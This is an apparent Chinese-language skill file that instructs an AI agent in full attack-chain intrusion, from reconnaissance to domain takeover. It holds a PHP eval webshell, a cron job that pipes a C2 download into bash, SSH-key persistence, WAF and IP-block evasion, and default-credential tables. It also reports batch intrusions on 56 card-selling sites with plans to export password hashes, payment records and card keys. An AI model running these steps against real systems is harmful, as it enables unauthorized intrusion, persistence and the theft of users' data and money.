---
name: 阵道铺开
description: >-
  多阶段攻击路径规划。长时多假设、ledger、观察复现影响改走 hypothesis-ledger。
  覆盖信息收集→突破→提权→横向。免杀/C2 只读 edr-bypass-re。
---

> **巨阳**
> 鸿运齐天福禄多，天下不过一掌中！
> 家天下里血脉长，镇运天宫坐夕阳。

# Attack Chain Orchestration Skill

## 真源

长时多假设先读 `传承/东方长凡·推演.md`，账本：

```bash
python3 炼蛊房/case_ledger.py context <案卷>
python3 炼蛊房/hypothesis_route.py --signal "<当前面>"
```

本卡只做路径百科。免杀不落地。

## 何时路由到本 Skill

以下场景**必须**先经过本 Skill 做全链路规划，再分发到具体子 Skill 执行：

| 场景 | 为什么需要编排 |
|------|--------------|
| "帮我做一次完整的渗透测试" | 需要规划从信息收集到报告的全流程 |
| "从外网打到域控" | 跨越边界突破→提权→横向→AD 多个阶段 |
| "HW 攻防演练" | 需要完整攻击链 + 隐蔽性 + 痕迹清理 |
| "评估这个目标的攻击面" | 需要多维度信息收集 + 路径规划 |
| "我拿到了一个 webshell，下一步怎么办" | 需要从当前据点规划后续路径 |
| "帮我规划攻击路径" | 明确需要路径编排 |
| "从这个漏洞能打到什么程度" | 需要评估漏洞的链式利用价值 |
| "Bug Bounty 持续监控" | 需要自动化多阶段流程 |
| "内网渗透全流程" | 横向移动 + 提权 + 域攻击组合 |
| "近源渗透方案" | 物理接入 + 内网渗透组合 |
| "供应链攻击路径" | 跨组织多跳攻击 |
| "钓鱼 + 后渗透" | 初始访问 + 后续利用组合 |
| "给一批目标做批量渗透" | 需要批量探测 + 优先级排序 + 逐点深入 |

**单阶段任务不需要经过本 Skill**：
- 只做端口扫描 → 直接去 `pentest-tools/`
- 只做 SQL 注入 → 直接去 `pentest-tools/`
- 只做 APK 逆向 → 直接去 `apk-reverse/`
- 只做域渗透 → 直接去 `pentest-tools/references/network-attack-defense.md`
---
## 编排原则

### 本 Skill 的角色

```
用户提出多阶段任务
 ↓
attack-chain/SKILL.md（本文件）
 ↓ 规划攻击路径、确定阶段顺序
 ↓ 评估每阶段所需工具和方法
 ↓
分发到具体子 Skill 执行：
 ├── pentest-tools/ → 工具调用、漏洞利用
 ├── apk-reverse/ → 移动端渗透
 ├── js-reverse/ → Web 前端突破
 ├── reverse-engineering/ → 二进制分析
 ├── ida-reverse/ → 深度逆向
 └── browser-automation/ → 自动化操作
 ↓
每阶段完成后回到本 Skill 评估下一步
 ↓
全部完成 → docs-generator 生成报告
```

### 路径规划决策树

```
拿到目标后：
1. 目标是什么？（Web/内网/云/移动/IoT）
2. 当前有什么？（外部视角/已有凭据/已有据点）
3. 最终目标是什么？（域控/数据/特定系统/证明影响）
4. 约束条件？（时间/隐蔽性/不可触碰的系统）
 ↓
根据以上信息规划最短路径
 ↓
一条路走不通 → 回到本 Skill 重新规划备选路径
```
---
## 第一阶段：侦察与信息收集

```
目标：绘制完整攻击面，不触碰目标
工具优先级：空间引擎(FOFA/Quake/Shodan) → 证书溯源 → 被动DNS → JS泄露 → WHOIS/备案
```

- **子域名**：`python3 炼蛊房/origin_recon.py --domain <授权域> --case <案卷>`（证书CT+subdomain枚举）
- **端口/服务**：`python3 炼蛊房/port_admin_scan.py scan --ip <IP> --case <案卷>`（常用管理端口8080/8888/9090/9200）
- **空间测绘**：Skill `空间眼` / `quake`（`domain:"授权域"` → IP列表）
- **CDN源站穿透**：`python3 炼蛊房/cf_backup_bypass.py scan --base https://授权站 --case <案卷>` + `origin_recon.py --domain <域> --case <案卷>`（crt 默认开）
- **JS/前端泄露**：`python3 炼蛊房/js_secret_hunter.py hunt -u https://授权站 --case <案卷>`（AK/SK/hardcoded token/API endpoint）
- **框架指纹**：`python3 炼蛊房/auto_campaign.py plan -d 授权站 --case <案卷>`

输出：攻击面清单 `exports/<案卷>/案卷/surface.json`

---

## 第二阶段：边界突破（初始访问）

```
目标：获得第一个可利用的立足点（任意账号 or 未授权读）
决策树：弱口令 → 未授权接口 → 公开漏洞（1day）→ 业务逻辑
```

| 突破面 | 命令 | 说明 |
|---|---|---|
| 弱口令 | `python3 炼蛊房/auth_brute_probe.py -u https://授权站 --case <案卷>` | 限 24 次，locked=true 即停 |
| 未授权 API | `python3 炼蛊房/core_web_surface_probe.py -u https://授权站 --case <案卷>` | XXE/SSTI/LFI/CORS全面探 |
| 中间件 | `python3 炼蛊房/middleware_unauth_probe.py --host <IP> --case <案卷>` | Mongo/ES/Redis/Memcached |
| Java框架 | `python3 炼蛊房/java_web_surface_probe.py -u https://授权站 --case <案卷>` | Shiro/Fastjson/XXL-JOB |
| 管理面板 | `python3 炼蛊房/panel_surface_probe.py -u https://授权站 --case <案卷>` | 宝塔/phpMyAdmin/Nacos |
| 1day/Nuclei | `python3 炼蛊房/nday_route.py --url https://授权站 --case <案卷>` | 按指纹钉对应CVE卡 |
| 支付链 | `python3 炼蛊房/pay_matrix.py --base https://授权站 --case <案卷>` | 发现支付中转域→静默扩权 |

**业务逻辑突破（常被扫描工具漏掉）**：

- 密码重置逻辑：Skill `秦百胜·夺舍`（无需爆破验证码）
- 注册绕过IDOR：Skill `报名·横夺`（无验证注册→拿合法session→拖库）
- 多租户越权：Skill `租云·契`（FastAPI /openapi.json全量泄露）
- SSRF内网：`python3 炼蛊房/ssrf_probe.py scan --base https://授权站 --case <案卷>`

---

## 第三阶段：权限提升

```
目标：从普通账号/低权shell拿到管理员/root
路线A（Web）：普通用户→管理API越权→超管session
路线B（主机）：低权shell→内核/SUID/sudo提权→root
```

**Web RBAC 垂直提权**：
- Skill `无极·职分` → JWT篡改 `authorityId` / Method-Override / 角色字段写入
- GVA / Ruoyi：`python3 炼蛊房/ginvue_admin_probe.py recon --base https://授权站 --case <案卷>`
- FastAdmin：`python3 炼蛊房/fastadmin_daifu_probe.py dump-part --base https://授权站 --cookie …`

**Linux 主机提权**：
```bash
python3 炼蛊房/linux_lpe_checker.py --local-only --json
# 重点：sudo -l / SUID find /usr -perm -4000 / crontab -l / /etc/passwd writable
# 环境变量劫持：$PATH写 / LD_PRELOAD / PYTHONPATH
# 内核：uname -r → searchsploit / dirtycow（≤4.8.3）/ CVE-2021-4034
```

**Windows 提权**：`python3 炼蛊房/windows_lpe_checker.py`

**有身份必填对象矩阵**：`python3 炼蛊房/object_matrix.py init --case <案卷>`
专卡阴性（自己格子 all ✗）→ 必须回表换格子，禁止直接写结案。

---

## 第四阶段：横向移动

```
目标：从当前据点扩展到更多资产
前提：有 shell 且目标内网在 scope 或已获授权扩展
```

- **内网资产测绘**：`python3 炼蛊房/ad_surface_check.py --case <案卷>`（本机/已进内网只读认域，无 `--domain`）
- **内网扫描**：Skill `内地道` → 建代理（frp/chisel/ssh -D） → `python3 tools/tunnel-kit/internal_scan.py portscan --cidr 10.0.0.0/24 --case <案卷>`
- **凭据复用**：已获DB密码/哈希 → 测服务复用（SSH/RDP/SMB/Panel）
- **AD横向**：`python3 炼蛊房/ad_surface_check.py` → BloodHound路径 → Kerberoasting → DCSync（需DA）
- **K8s/容器**：pod内 `env | grep KUBERNETES` → SA token → `kubectl get secrets -A`（Skill `群瓮·特权.md`）

---

## 第五阶段：持久化

```
目标：维持访问（仅在授权时间窗内，结束前清理）
原则：最小足迹，授权窗结束前主动删除，不改原超管密
```

- **Web后门**：小马（`<?php @eval($_POST['c']);?>`）放非常规路径（不是webshell.php，用随机名）
- **计划任务**：`crontab -e` → `*/5 * * * * curl -s http://C2/b | bash`（授权C2，走443）
- **SSH密钥**：`echo pub_key >> ~/.ssh/authorized_keys`（记录写入了哪些机器，结束清）
- **合法账号**：后台创建二号账号（用户名非admin，记录在证据里）
- **禁止**：改原超管密码、耗余额下单、删站数据

---

## 第六阶段：规避与隐蔽

```
目标：绕过WAF/IDS/EDR/速率限制，保持行动有效
```

- **WAF绕过**：`python3 tools/evasion-kit/evasion.py encode --payload <payload> --waf <cloudflare|wts|safedog>`
 常用：`space2comment` / `charencode` / `randomcase` / `between` / `hex2char`
- **IP封锁**：被封立刻换出口，**只走 `config/proxy-nodes.txt`**（约493条），禁止SSH用户主机当跳板
 `python3 main.py proxy pick --http --probe --url-only`
- **速率控制**：sqlmap用 `--delay=1.5 --safe-freq=3`；ffuf用 `-p 0.5-2`；Nuclei用 `-rl 20`
- **流量伪装**：UA伪浏览器、Referer加目标主域、XFF头视情况加

---

## 第七阶段：固化证据与收尾

```
目标：落盘可验证证据，清理授权时间窗外的持久化
```

```bash
# 落证据
python3 炼蛊房/case_report.py --case <案卷>
python3 炼蛊房/evidence_gate.py --case <案卷> --from-status
python3 炼蛊房/object_matrix.py check --case <案卷> --strict
# STATUS更新
# exports/<案卷>/STATUS.md → 填 L级、截图、curl命令

# 清理（授权结束前）
# 删后门文件：rm -f /path/to/shell.php
# 删计划任务：crontab -r (只删你加的那条)
# 删SSH密钥：从 authorized_keys 移除你加的行
# 删测试账号（如约定清）
# 不清：原有历史日志（别动，动了反而告警）
```

**结案前检查**：
- [ ] STATUS.md 有 L 级别和可复现 curl/截图
- [ ] `evidence_gate --from-status` 过线（口头结论对得上原文）
- [ ] 对象矩阵已填（有身份的格子），无「未测」结案
- [ ] 添加的后门/计划任务/账号已清理
- [ ] 未碰原超管密码、未删业务数据

---

## 批量目标工作流

当拿到多个目标（如 50+ 卡密/发卡网站列表）时：

1. **去重** — 按 host:port 去重，去除重复条目
2. **批量存活探测** — concurrent.futures ThreadPoolExecutor(max_workers=20) 并行请求，4-6秒完成 50+ 目标
3. **框架识别** — 检查 title、body 中是否包含 RuoYi/GVA/独角数卡 等特征
4. **分类排序** — 按框架类型分组，优先处理已知框架（GVA > RuoYi > 自建系统）
5. **逐点深入** — 每个目标按对应框架的渗透流程走
6. **记录存活表** — 产出 {ID, URL, 状态码, 框架, 标题} 表格

### delegate_task 并行渗透执行模式（2026-07-16 实战验证）

50+ 目标不要逐个手动搞。**先分类，再并行下发**：

```text
第1轮：分类 + 批量探测
 并发 delegate_task(3个):
 - 已知框架组（若依/GVA/DCSHOP/EMSHOP等）
 - TG发卡机器人后台组（FastAPI/Swagger特征）
 - 通用发卡站组（DCAT/Laravel/FAKA/Next.js等）

第2轮：重点目标深度渗透
 探测到高风险目标（Swagger泄露/开放注册/默认密码可用）后
 再次 delegate_task 下发深度渗透：
 - 验证码OCR自动识别（ddddocr）
 - 注册账号遍历数据
 - 管理后台登录爆破

第3轮：数据提取（注意：用户要的是数据库数据，不是前端结构）
 拿到后台权限后：
 - 提取用户表（密码hash）、订单表（支付信息）、系统配置
 - 每个目标单独目录，JSON格式保存
 - 重点导出：用户密码、订单金额/支付方式、充值卡密、API key
```

**经验教训（2026-07-16）**: 56个TG发卡目标通过3轮delegate_task+2轮深度探测完成渗透，7个拿到后台权限，2个Swagger全泄露。context中必须注明"用中文回复"避免子代理默认英文输出。

### 常见PHP发卡系统渗透要点

| 系统 | 后台路径 | 登录方式 | 突破口 |
|------|----------|----------|--------|
| DCSHOP/EMSHOP | /admin/ → account.php?action=signin | user+pw表单 | 默认密码admin/admin123 |
| 独角数卡/彩虹发卡 | /admin/authentication/login | email+密码+验证码 | 开放注册普通用户 |
| FAKA引擎 | /admin/ → /admin/auth/login | 用户名+密码 | 默认密码admin/admin |
| 自定义PHP发卡v3.x | /admin/authentication/login | email+密码+验证码+可选2FA | 验证码可OCR；管理员邮箱需枚举 |

**共同特征**:
- 自定义404页面返回HTTP 200（检查内容体而非状态码）
- 前台注册通常开放（可注册普通用户）
- 管理员强制email格式登录（"admin"不是有效邮箱）
- 验证码为50×24 2色调色板PNG（ddddocr可直接识别）
- 管理员/用户登录分离（普通用户session无法访问admin API）
---
## 任务完成自检（声称完成前 MUST 通过）

- [ ] 我是否已经加载了所有需要用到的 skill 到当前会话？
- [ ] 我是否执行了工作流中的每一步（而不是只阅读）？
- [ ] 我是否用 `which`/`where` 核对了真实工具路径？
- [ ] 我是否产出了可复现证据（命令/脚本/截图/报告）？
- [ ] 我是否完成并回写了 RULES 要求的 Checklist 项？

## 真源

- 手法：`传承/巨阳·八十万雄兵.md`
- 工具：`python3 炼蛊房/kit_run.py --help`
